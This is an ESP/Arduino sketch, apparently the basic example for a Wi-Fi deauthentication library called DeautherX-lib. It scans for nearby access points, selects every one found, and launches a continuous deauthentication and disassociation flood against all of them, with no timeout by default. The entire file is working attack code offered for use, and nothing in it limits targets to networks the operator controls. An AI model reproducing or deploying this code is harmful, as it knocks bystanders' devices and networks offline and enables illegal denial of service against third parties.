/*
 * DeautherX-lib — Basic Deauth Example
 *
 * Scans for APs, selects ALL of them, and starts a deauth attack.
 * Open Serial Monitor at 115200 to watch.
 */

#include <DeautherLib.h>

DeautherScanner scanner;
DeautherAttack  attack;

void setup() {
    Serial.begin(115200);
    Serial.println(F("\n[BasicDeauth] Starting AP scan..."));

    // Load persistent settings
    DSettingsManager::load();

    // Scan for APs (blocks ~3 seconds using the SDK)
    scanner.startAP();
    delay(3000);

    // Print results
    scanner.printAPs();

    if (scanner.getAPs().size() == 0) {
        Serial.println(F("No APs found. Retrying in 5s..."));
        delay(5000);
        ESP.restart();
    }

    // Select ALL APs
    scanner.selectAllAPs();

    // Build attack config
    DeauthConfig cfg;
    cfg.targets.fromSelectedAPs(scanner.getAPs());
    cfg.deauth   = true;
    cfg.disassoc = true;
    cfg.pkt_rate = 20;
    // cfg.timeout = 60000; // Uncomment to auto-stop after 60s

    // Start attack
    Serial.print(F("\n[BasicDeauth] Starting deauth attack on "));
    Serial.print(cfg.targets.size());
    Serial.println(F(" targets..."));

    attack.startDeauth(cfg);
}

void loop() {
    attack.update();

    // Print status every 2 seconds
    static unsigned long lastPrint = 0;
    if (millis() - lastPrint > 2000) {
        attack.printStatus();
        lastPrint = millis();
    }
}
